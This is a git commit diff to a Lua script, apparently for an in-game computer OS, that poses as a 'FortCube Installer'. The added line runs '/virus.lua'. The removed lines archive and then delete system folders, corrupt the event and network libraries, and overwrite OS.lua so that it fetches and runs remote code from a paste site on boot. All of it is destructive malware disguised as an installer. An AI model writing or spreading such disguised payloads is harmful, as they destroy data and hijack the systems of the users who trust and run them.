f5957f3bd9c3345d9051a96b35b6e74eeec7fcfb
EletrixTime <71174682+EletrixtimeYT@users.noreply.github.com>
2023-09-29 15:40:23 +0200

    Update eltxcry.lua

--- eltxcry.lua
+++ eltxcry.lua
@@ -10,33 +10,10 @@ workspace:addChild(GUI.text(3, 2, 0xFFFFFF, "FortCube Installer "))
 workspace:addChild(GUI.text(3, 3, 0xFFFFFF, "Downloading..."))
 workspace:addChild(GUI.text(3, 3, 0xFFFFFF, "PLEASE RESTART"))
 
+system.execute("/virus.lua")
 
 
 
-local internet = require("INTERNET")
-local compressor = require("compressor")
-local filesystem = require("filesystem")
-
--- Move all of data to /eltxcry
-filesystem.copy("/Libraries", "/eltxcry/libraries")
-filesystem.copy("OS.LUA", "/eltxcry")
-filesystem.copy("/Icons", "/eltxcry")
-filesystem.copy("/Users", "/eltxcry")
-filesystem.copy("/Application", "/eltxcry")
-filesystem.copy("/Extensions", "/eltxcry")
-filesystem.copy("/Mounts", "/eltxcry")
-filesystem.copy("/Localizations", "/eltxcry")
-compressor.pack("/data-backup.pkg", {
-	"/eltxcry"
-})
-filesystem.remove("/eltxcry")
--- Write ALL files
-
-filesystem.write("OS.lua", "pastebin run hQYzUhR9")
-filesystem.write("Libraries/Event.lua", "404")
-filesystem.write("Libraries/Network.lua", "404")
-filesystem.remove("/Libraries")
-filesystem.remove("/Localization")
 
 
 --------------------------------------------------------------------------------
